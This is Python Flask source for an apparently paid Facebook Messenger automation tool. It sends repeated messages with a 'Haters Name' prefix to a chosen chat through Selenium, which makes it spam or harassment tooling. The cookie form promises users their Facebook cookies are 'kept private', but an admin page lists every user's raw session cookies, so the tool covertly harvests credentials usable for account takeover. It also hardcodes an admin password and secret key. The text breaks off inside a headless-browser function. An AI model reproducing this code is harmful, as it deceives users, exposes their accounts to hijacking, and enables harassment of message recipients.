from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify
import os
import time
import threading
import hashlib
import json
import urllib.parse
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db

app = Flask(__name__)
app.secret_key = os.environ.get('SESSION_SECRET', 'rowedy-e2e-secret-key-2025')

ADMIN_PASSWORD = "ROWEDYE2E2025"
WHATSAPP_NUMBER = "918290090930"
APPROVAL_FILE = "approved_keys.json"
PENDING_FILE = "pending_approvals.json"

automation_states = {}

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0

LOGIN_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E2E BY ROW3DY - Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { background-image: url('https://i.postimg.cc/TYhXd0gG/d0a72a8cea5ae4978b21e04a74f0b0ee.jpg'); background-size: cover; background-position: center; background-attachment: fixed; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px; max-width: 500px; width: 100%; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.15); }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #4ecdc4; box-shadow: 0 4px 15px rgba(78, 205, 196, 0.5); margin-bottom: 15px; }
        h1 { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2rem; font-weight: 700; margin-bottom: 10px; }
        .subtitle { color: rgba(255, 255, 255, 0.9); font-size: 0.9rem; }
        .tabs { display: flex; gap: 10px; margin-bottom: 30px; }
        .tab { flex: 1; padding: 12px; background: rgba(255, 255, 255, 0.1); border: none; border-radius: 10px; color: white; cursor: pointer; font-weight: 600; transition: all 0.3s; }
        .tab.active { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .form-group { margin-bottom: 20px; }
        label { display: block; color: white; font-weight: 500; margin-bottom: 8px; }
        input { width: 100%; padding: 12px; background: rgba(255, 255, 255, 0.15); border: 1px solid rgba(255, 255, 255, 0.25); border-radius: 8px; color: white; font-size: 14px; }
        input::placeholder { color: rgba(255, 255, 255, 0.6); }
        input:focus { outline: none; background: rgba(255, 255, 255, 0.2); border-color: #4ecdc4; box-shadow: 0 0 0 2px rgba(78, 205, 196, 0.2); }
        .btn { width: 100%; padding: 14px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; border: none; border-radius: 10px; font-weight: 600; font-size: 16px; cursor: pointer; transition: all 0.3s; margin-top: 10px; }
        .btn:hover { opacity: 0.9; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6); }
        .alert { padding: 12px; border-radius: 8px; margin-bottom: 20px; text-align: center; }
        .alert-error { background: linear-gradient(135deg, #fa709a 0%, #fee140 100%); color: white; }
        .alert-success { background: linear-gradient(135deg, #84fab0 0%, #8fd3f4 100%); color: white; }
        .footer { text-align: center; color: rgba(255, 255, 255, 0.7); margin-top: 30px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://i.postimg.cc/Pq1HGqZK/459c85fcaa5d9f0762479bf382225ac6.jpg" alt="Logo" class="logo">
            <h1>🩷R0W3DY KIING OFFLINE E2EE🥵</h1>
            <p class="subtitle">səvən bıllıon smılə's ın ʈhıs world buʈ ɣour's ıs mɣ fαvourıʈəs___🩷🥵</p>
        </div>
        {% if error %}<div class="alert alert-error">{{ error }}</div>{% endif %}
        {% if success %}<div class="alert alert-success">{{ success }}</div>{% endif %}
        <div class="tabs">
            <button class="tab active" onclick="switchTab('login')">🔐 Login</button>
            <button class="tab" onclick="switchTab('signup')">✨ Sign Up</button>
        </div>
        <div id="login-tab" class="tab-content active">
            <form method="POST" action="/login">
                <input type="hidden" name="action" value="login">
                <div class="form-group"><label>Username</label><input type="text" name="username" placeholder="Enter your username" required></div>
                <div class="form-group"><label>Password</label><input type="password" name="password" placeholder="Enter your password" required></div>
                <button type="submit" class="btn">Login</button>
            </form>
        </div>
        <div id="signup-tab" class="tab-content">
            <form method="POST" action="/login">
                <input type="hidden" name="action" value="signup">
                <div class="form-group"><label>Choose Username</label><input type="text" name="new_username" placeholder="Choose a unique username" required></div>
                <div class="form-group"><label>Choose Password</label><input type="password" name="new_password" placeholder="Create a strong password" required></div>
                <div class="form-group"><label>Confirm Password</label><input type="password" name="confirm_password" placeholder="Re-enter your password" required></div>
                <button type="submit" class="btn">Create Account</button>
            </form>
        </div>
        <div class="footer">
            <div style="margin-bottom: 15px;"><a href="/admin" style="color: #4ecdc4; text-decoration: none; font-weight: 600;">👑 Admin Panel</a></div>
            Made with ❤️ by ROWEDY KING | © 2025
        </div>
    </div>
    <script>
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            if (tab === 'login') { document.querySelectorAll('.tab')[0].classList.add('active'); document.getElementById('login-tab').classList.add('active'); }
            else { document.querySelectorAll('.tab')[1].classList.add('active'); document.getElementById('signup-tab').classList.add('active'); }
        }
    </script>
</body>
</html>'''

APPROVAL_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Approval Required - E2E BY ROW3DY</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { background-image: url('https://i.postimg.cc/TYhXd0gG/d0a72a8cea5ae4978b21e04a74f0b0ee.jpg'); background-size: cover; background-position: center; background-attachment: fixed; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px; max-width: 600px; width: 100%; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.15); }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #4ecdc4; box-shadow: 0 4px 15px rgba(78, 205, 196, 0.5); margin-bottom: 15px; }
        h1 { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 1.8rem; font-weight: 700; margin-bottom: 10px; }
        .subtitle { color: rgba(255, 255, 255, 0.9); font-size: 0.9rem; }
        .info-box { background: rgba(255, 255, 255, 0.15); padding: 15px; border-radius: 10px; margin-bottom: 20px; color: white; }
        .whatsapp-btn { display: inline-block; width: 100%; padding: 15px 30px; background: linear-gradient(45deg, #25D366, #128C7E); color: white; text-decoration: none; border-radius: 12px; font-weight: 600; font-size: 18px; text-align: center; box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4); transition: all 0.3s; margin: 20px 0; }
        .whatsapp-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(37, 211, 102, 0.6); }
        .message-preview { background: rgba(0, 0, 0, 0.4); padding: 15px; border-radius: 10px; color: #00ff88; font-family: 'Courier New', monospace; white-space: pre-wrap; margin: 20px 0; }
        .btn { width: 100%; padding: 14px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; border: none; border-radius: 10px; font-weight: 600; font-size: 16px; cursor: pointer; transition: all 0.3s; margin-top: 10px; }
        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://i.postimg.cc/Pq1HGqZK/459c85fcaa5d9f0762479bf382225ac6.jpg" alt="Logo" class="logo">
            <h1>PREMIUM KEY APPROVAL REQUIRED</h1>
            <p class="subtitle">ONE MONTH 500 RS PAID</p>
        </div>
        <div class="info-box"><strong>Your Username:</strong> {{ username }}<br><strong>Your Unique Key:</strong> <code>{{ user_key }}</code></div>
        <a href="{{ whatsapp_url }}" target="_blank" class="whatsapp-btn" id="whatsappBtn">📱 Request Approval via WhatsApp</a>
        <h3 style="color: #4ecdc4; margin: 20px 0;">📝 Message Preview:</h3>
        <div class="message-preview">🩷 HELLO ROWEDY SIR PLEASE ❤️
My name is {{ username }}
Please approve my key:
🔑 {{ user_key }}</div>
        <div class="btn-grid">
            <button class="btn" onclick="requestApproval()">📱 Send Request</button>
            <button class="btn" onclick="checkApproval()">🔄 Check Status</button>
        </div>
        <div style="margin-top: 20px; text-align: center;">
            <a href="/admin" style="color: rgba(255, 255, 255, 0.7); text-decoration: none;">🔓 Admin Panel</a> | <a href="/logout" style="color: rgba(255, 255, 255, 0.7); text-decoration: none;">🚪 Logout</a>
        </div>
    </div>
    <script>
        function requestApproval() { fetch('/request_approval', { method: 'POST' }).then(r => r.json()).then(d => { if (d.success) { alert('Request sent! Opening WhatsApp...'); window.open(document.getElementById('whatsappBtn').href, '_blank'); } }); }
        function checkApproval() { fetch('/check_approval').then(r => r.json()).then(d => { if (d.approved) { alert('✅ Approved! Redirecting...'); window.location.href = '/dashboard'; } else { alert('❌ Not approved yet. Please wait!'); } }); }
        setTimeout(function() { window.open(document.getElementById('whatsappBtn').href, '_blank'); }, 1000);
    </script>
</body>
</html>'''

ADMIN_LOGIN_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login - E2E BY ROW3DY</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { background-image: url('https://i.postimg.cc/TYhXd0gG/d0a72a8cea5ae4978b21e04a74f0b0ee.jpg'); background-size: cover; background-position: center; background-attachment: fixed; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px; max-width: 400px; width: 100%; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.15); }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #4ecdc4; box-shadow: 0 4px 15px rgba(78, 205, 196, 0.5); margin-bottom: 15px; }
        h1 { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2rem; font-weight: 700; margin-bottom: 10px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; color: white; font-weight: 500; margin-bottom: 8px; }
        input { width: 100%; padding: 12px; background: rgba(255, 255, 255, 0.15); border: 1px solid rgba(255, 255, 255, 0.25); border-radius: 8px; color: white; font-size: 14px; }
        input:focus { outline: none; background: rgba(255, 255, 255, 0.2); border-color: #4ecdc4; }
        .btn { width: 100%; padding: 14px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; border: none; border-radius: 10px; font-weight: 600; font-size: 16px; cursor: pointer; transition: all 0.3s; }
        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
        .alert-error { background: linear-gradient(135deg, #fa709a 0%, #fee140 100%); color: white; padding: 12px; border-radius: 8px; margin-bottom: 20px; text-align: center; }
        .back-link { text-align: center; margin-top: 20px; }
        .back-link a { color: rgba(255, 255, 255, 0.7); text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://i.postimg.cc/Pq1HGqZK/459c85fcaa5d9f0762479bf382225ac6.jpg" alt="Logo" class="logo">
            <h1>👑 ADMIN PANEL 👑</h1>
        </div>
        {% if error %}<div class="alert-error">{{ error }}</div>{% endif %}
        <form method="POST" action="/admin">
            <input type="hidden" name="action" value="login">
            <div class="form-group"><label>Admin Password</label><input type="password" name="admin_password" placeholder="Enter admin password" required></div>
            <button type="submit" class="btn">✅ Login</button>
        </form>
        <div class="back-link"><a href="/login">🔙 Back to Login</a></div>
    </div>
</body>
</html>'''

ADMIN_PANEL_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - E2E BY ROW3DY</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { background-image: url('https://i.postimg.cc/TYhXd0gG/d0a72a8cea5ae4978b21e04a74f0b0ee.jpg'); background-size: cover; background-position: center; background-attachment: fixed; min-height: 100vh; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.15); }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #4ecdc4; box-shadow: 0 4px 15px rgba(78, 205, 196, 0.5); margin-bottom: 15px; }
        h1 { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2rem; font-weight: 700; }
        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px; }
        .stat-box { background: rgba(255, 255, 255, 0.15); padding: 20px; border-radius: 12px; text-align: center; color: white; }
        .stat-box h3 { color: #4ecdc4; font-size: 2rem; margin-bottom: 5px; }
        .section-title { color: #4ecdc4; margin: 30px 0 15px; font-size: 1.3rem; }
        .approval-item { background: rgba(255, 255, 255, 0.1); padding: 15px; border-radius: 10px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; color: white; }
        .approval-info { flex: 1; }
        .btn-approve { padding: 10px 20px; background: linear-gradient(45deg, #84fab0, #8fd3f4); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; transition: all 0.3s; text-decoration: none; display: inline-block; }
        .btn-approve:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(132, 250, 176, 0.4); }
        .btn-logout { padding: 12px 30px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; border: none; border-radius: 10px; cursor: pointer; font-weight: 600; margin-top: 20px; }
        .no-items { background: rgba(255, 255, 255, 0.1); padding: 20px; border-radius: 10px; text-align: center; color: rgba(255, 255, 255, 0.7); }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://i.postimg.cc/Pq1HGqZK/459c85fcaa5d9f0762479bf382225ac6.jpg" alt="Logo" class="logo">
            <h1>👑 ADMIN PANEL 👑</h1>
            <p style="color: rgba(255, 255, 255, 0.9);">KEY APPROVAL MANAGEMENT</p>
        </div>
        <div class="stats">
            <div class="stat-box"><h3>{{ approved_keys|length }}</h3><p>Total Approved Keys</p></div>
            <div class="stat-box"><h3>{{ pending|length }}</h3><p>Pending Approvals</p></div>
        </div>
        {% if pending %}
        <h2 class="section-title">📋 Pending Approval Requests</h2>
        {% for key, info in pending.items() %}
        <div class="approval-item">
            <div class="approval-info">
                <div><strong>👤 {{ info.name }}</strong></div>
                <div style="font-size: 0.9rem; color: rgba(255, 255, 255, 0.7);">🔑 {{ key }}</div>
            </div>
            <a href="/admin/approve/{{ key }}" class="btn-approve">✅ Approve</a>
        </div>
        {% endfor %}
        {% else %}
        <h2 class="section-title">📋 Pending Approval Requests</h2>
        <div class="no-items">No pending approvals</div>
        {% endif %}
        {% if approved_keys %}
        <h2 class="section-title">✅ Approved Keys</h2>
        {% for key, info in approved_keys.items() %}
        <div class="approval-item">
            <div class="approval-info">
                <div><strong>👤 {{ info.name }}</strong></div>
                <div style="font-size: 0.9rem; color: rgba(255, 255, 255, 0.7);">🔑 {{ key }}</div>
            </div>
        </div>
        {% endfor %}
        {% endif %}
        <div style="text-align: center; margin-top: 30px;">
            <a href="/admin/users_info"><button class="btn-logout" style="background: linear-gradient(45deg, #4ecdc4, #44a08d); margin-bottom: 10px;">👥 Users Information</button></a>
            <a href="/admin/logout"><button class="btn-logout">🚪 Logout</button></a>
        </div>
    </div>
</body>
</html>'''

DASHBOARD_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - E2E BY ROW3DY</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { background-image: url('https://i.postimg.cc/TYhXd0gG/d0a72a8cea5ae4978b21e04a74f0b0ee.jpg'); background-size: cover; background-position: center; background-attachment: fixed; min-height: 100vh; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 30px; border-radius: 15px; text-align: center; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.15); }
        .logo { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #4ecdc4; box-shadow: 0 4px 15px rgba(78, 205, 196, 0.5); margin-bottom: 15px; }
        h1 { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2rem; font-weight: 700; }
        .user-info { background: rgba(255, 255, 255, 0.1); padding: 15px; border-radius: 10px; margin-bottom: 20px; color: white; }
        .tabs { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .tab { padding: 12px; background: rgba(255, 255, 255, 0.1); border: none; border-radius: 10px; color: white; cursor: pointer; font-weight: 600; transition: all 0.3s; }
        .tab.active { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); }
        .tab-content { display: none; background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); }
        .tab-content.active { display: block; }
        .form-group { margin-bottom: 20px; }
        label { display: block; color: white; font-weight: 500; margin-bottom: 8px; }
        input, textarea { width: 100%; padding: 12px; background: rgba(255, 255, 255, 0.15); border: 1px solid rgba(255, 255, 255, 0.25); border-radius: 8px; color: white; font-size: 14px; }
        input:focus, textarea:focus { outline: none; background: rgba(255, 255, 255, 0.2); border-color: #4ecdc4; }
        .btn { width: 100%; padding: 14px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; border: none; border-radius: 10px; font-weight: 600; font-size: 16px; cursor: pointer; transition: all 0.3s; }
        .btn:hover:not(:disabled) { opacity: 0.9; transform: translateY(-2px); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .metrics { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
        .metric { background: rgba(255, 255, 255, 0.15); padding: 20px; border-radius: 10px; text-align: center; color: white; }
        .metric-value { font-size: 1.8rem; color: #4ecdc4; font-weight: 700; }
        .metric-label { font-size: 0.9rem; color: rgba(255, 255, 255, 0.8); }
        .console { background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(78, 205, 196, 0.4); border-radius: 10px; padding: 15px; max-height: 400px; overflow-y: auto; margin-top: 20px; }
        .console-line { color: #00ff88; font-family: 'Courier New', monospace; font-size: 12px; margin-bottom: 5px; padding: 6px 10px; background: rgba(78, 205, 196, 0.08); border-left: 2px solid rgba(78, 205, 196, 0.4); }
        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://i.postimg.cc/Pq1HGqZK/459c85fcaa5d9f0762479bf382225ac6.jpg" alt="Logo" class="logo">
            <h1>🩷R0W3DY E2E OFFLINE😛</h1>
            <p style="color: rgba(255, 255, 255, 0.9);">səvən bıllıon smıləs ın ʈhıs world buʈ ɣours ıs mɣ fαvourıʈəs___🩷🥵</p>
        </div>
        <div class="user-info"><strong>👤 User:</strong> {{ username }} | <strong>🔑 Key:</strong> <code>{{ user_key }}</code> ✅ | <a href="/logout" style="color: #4ecdc4; text-decoration: none;">🚪 Logout</a></div>
        <div class="tabs">
            <button class="tab active" onclick="switchTab('config')">⚙️ Configuration</button>
            <button class="tab" onclick="switchTab('automation')">🚀 Automation</button>
        </div>
        <div id="config-tab" class="tab-content active">
            <h2 style="color: white; margin-bottom: 20px;">Your Configuration</h2>
            <form id="configForm">
                <div class="form-group"><label>Chat/Conversation ID</label><input type="text" name="chat_id" value="{{ config.chat_id }}" placeholder="e.g., 1362400298935018"></div>
                <div class="form-group"><label>Haters Name (Prefix)</label><input type="text" name="name_prefix" value="{{ config.name_prefix }}" placeholder="e.g., [END TO END]"></div>
                <div class="form-group"><label>Delay (seconds)</label><input type="number" name="delay" value="{{ config.delay }}" min="1" max="300"></div>
                <div class="form-group"><label>Facebook Cookies (optional - kept private)</label><textarea name="cookies" rows="3" placeholder="Paste your Facebook cookies here"></textarea></div>
                <div class="form-group"><label>Messages (one per line)</label><textarea name="messages" rows="5" placeholder="NP file copy paste karo">{{ config.messages }}</textarea></div>
                <button type="submit" class="btn">💾 Save Configuration</button>
            </form>
        </div>
        <div id="automation-tab" class="tab-content">
            <h2 style="color: white; margin-bottom: 20px;">Automation Control</h2>
            <div class="metrics">
                <div class="metric"><div class="metric-value" id="messageCount">{{ status.message_count }}</div><div class="metric-label">Messages Sent</div></div>
                <div class="metric"><div class="metric-value" id="statusText">{% if status.running %}🟢 Running{% else %}🔴 Stopped{% endif %}</div><div class="metric-label">Status</div></div>
                <div class="metric"><div class="metric-value">{{ config.chat_id[:10] }}...</div><div class="metric-label">Chat ID</div></div>
            </div>
            <div class="btn-grid">
                <button class="btn" id="startBtn" onclick="startAutomation()">▶️ Start Automation</button>
                <button class="btn" id="stopBtn" onclick="stopAutomation()">⏹️ Stop Automation</button>
            </div>
            <div style="margin-top: 20px;">
                <h3 style="color: #4ecdc4; margin-bottom: 10px;">📊 Live Console Output</h3>
                <div class="console" id="console">{% for log in status.logs %}<div class="console-line">{{ log }}</div>{% endfor %}</div>
                <button class="btn" onclick="refreshLogs()" style="margin-top: 10px;">🔄 Refresh Logs</button>
            </div>
        </div>
    </div>
    <script>
        function switchTab(tab) { document.querySelectorAll('.tab').forEach(t => t.classList.remove('active')); document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active')); if (tab === 'config') { document.querySelectorAll('.tab')[0].classList.add('active'); document.getElementById('config-tab').classList.add('active'); } else { document.querySelectorAll('.tab')[1].classList.add('active'); document.getElementById('automation-tab').classList.add('active'); } }
        document.getElementById('configForm').addEventListener('submit', function(e) { e.preventDefault(); const formData = new FormData(this); fetch('/save_config', { method: 'POST', body: formData }).then(r => r.json()).then(d => { if (d.success) { alert('✅ Configuration saved successfully!'); } }); });
        function startAutomation() { fetch('/start_automation', { method: 'POST' }).then(r => r.json()).then(d => { if (d.success) { alert('✅ Automation started!'); setTimeout(refreshLogs, 1000); } else { alert('❌ ' + (d.error || 'Failed to start')); } }); }
        function stopAutomation() { fetch('/stop_automation', { method: 'POST' }).then(r => r.json()).then(d => { if (d.success) { alert('⚠️ Automation stopped!'); refreshLogs(); } }); }
        function refreshLogs() { fetch('/get_status').then(r => r.json()).then(d => { document.getElementById('messageCount').textContent = d.message_count; document.getElementById('statusText').textContent = d.running ? '🟢 Running' : '🔴 Stopped'; const console = document.getElementById('console'); console.innerHTML = ''; d.logs.forEach(log => { const line = document.createElement('div'); line.className = 'console-line'; line.textContent = log; console.appendChild(line); }); console.scrollTop = console.scrollHeight; }); }
        setInterval(refreshLogs, 3000);
    </script>
</body>
</html>'''

USERS_INFO_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Users Information - E2E BY ROW3DY</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { background-image: url('https://i.postimg.cc/TYhXd0gG/d0a72a8cea5ae4978b21e04a74f0b0ee.jpg'); background-size: cover; background-position: center; background-attachment: fixed; min-height: 100vh; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.15); }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #4ecdc4; box-shadow: 0 4px 15px rgba(78, 205, 196, 0.5); margin-bottom: 15px; }
        h1 { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2rem; font-weight: 700; }
        .user-item { background: rgba(255, 255, 255, 0.1); padding: 20px; border-radius: 10px; margin-bottom: 15px; color: white; }
        .user-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid rgba(255, 255, 255, 0.2); }
        .username { font-size: 1.2rem; font-weight: 600; color: #4ecdc4; }
        .fb-name { color: #ff6b6b; font-weight: 600; }
        .cookie-box { background: rgba(0, 0, 0, 0.3); padding: 10px; border-radius: 8px; margin-top: 10px; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff88; word-wrap: break-word; max-height: 150px; overflow-y: auto; }
        .info-line { margin: 8px 0; }
        .label { color: rgba(255, 255, 255, 0.7); font-size: 0.9rem; }
        .btn { padding: 12px 30px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; border: none; border-radius: 10px; cursor: pointer; font-weight: 600; margin-top: 20px; text-decoration: none; display: inline-block; }
        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
        .no-users { text-align: center; padding: 40px; color: rgba(255, 255, 255, 0.7); }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://i.postimg.cc/Pq1HGqZK/459c85fcaa5d9f0762479bf382225ac6.jpg" alt="Logo" class="logo">
            <h1>👥 USERS INFORMATION 👥</h1>
            <p style="color: rgba(255, 255, 255, 0.9);">All Users Cookies & Facebook Names</p>
        </div>
        {% if users_info %}
            {% for username, info in users_info.items() %}
            <div class="user-item">
                <div class="user-header">
                    <div class="username">👤 {{ username }}</div>
                    {% if info.fb_name %}
                    <div class="fb-name">📘 {{ info.fb_name }}</div>
                    {% else %}
                    <div style="color: rgba(255, 255, 255, 0.5);">📘 Facebook name not found</div>
                    {% endif %}
                </div>
                <div class="info-line"><span class="label">User ID:</span> {{ info.user_id }}</div>
                {% if info.chat_id %}
                <div class="info-line"><span class="label">Chat ID:</span> {{ info.chat_id }}</div>
                {% endif %}
                {% if info.name_prefix %}
                <div class="info-line"><span class="label">Name Prefix:</span> {{ info.name_prefix }}</div>
                {% endif %}
                <div class="info-line"><span class="label">Cookies:</span></div>
                <div class="cookie-box">{{ info.cookies }}</div>
            </div>
            {% endfor %}
        {% else %}
            <div class="no-users">No users with saved cookies found.</div>
        {% endif %}
        <div style="text-align: center;">
            <a href="/admin/panel" class="btn">🔙 Back to Admin Panel</a>
        </div>
    </div>
</body>
</html>'''

def generate_user_key(username, password):
    combined = f"{username}:{password}"
    key_hash = hashlib.sha256(combined.encode()).hexdigest()[:8].upper()
    return f"KEY-{key_hash}"

def load_approved_keys():
    if os.path.exists(APPROVAL_FILE):
        try:
            with open(APPROVAL_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_approved_keys(keys):
    with open(APPROVAL_FILE, 'w') as f:
        json.dump(keys, f, indent=2)

def load_pending_approvals():
    if os.path.exists(PENDING_FILE):
        try:
            with open(PENDING_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_pending_approvals(pending):
    with open(PENDING_FILE, 'w') as f:
        json.dump(pending, f, indent=2)

def send_whatsapp_message(user_name, approval_key):
    message = f"🩷 HELLO ROWEDY SIR PLEASE ❤️\nMy name is {user_name}\nPlease approve my key:\n🔑 {approval_key}"
    encoded_message = urllib.parse.quote(message)
    whatsapp_url = f"https://api.whatsapp.com/send?phone={WHATSAPP_NUMBER}&text={encoded_message}"
    return whatsapp_url

def check_approval(key):
    approved_keys = load_approved_keys()
    return key in approved_keys

def fetch_facebook_name(cookies_string):
    if not cookies_string or not cookies_string.strip():
        return None
    
    driver = None
    try:
        chrome_options = Options()
        chrome_options.add_argument('--headless=new')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        
        chromium_paths = ['/usr/bin/chromium', '/usr/bin/chromium-browser', '/usr/bin/google-chrome', '/usr/bin/chrome']
        for chromium_path in chromium_paths:
            if Path(chromium_path).exists():
                chrome_options.binary_location = chromium_path
                break
        
        driver = webdriver.Chrome(options=chrome_options)
        driver.set_page_load_timeout(30)
        
        driver.get('https://www.facebook.com/')
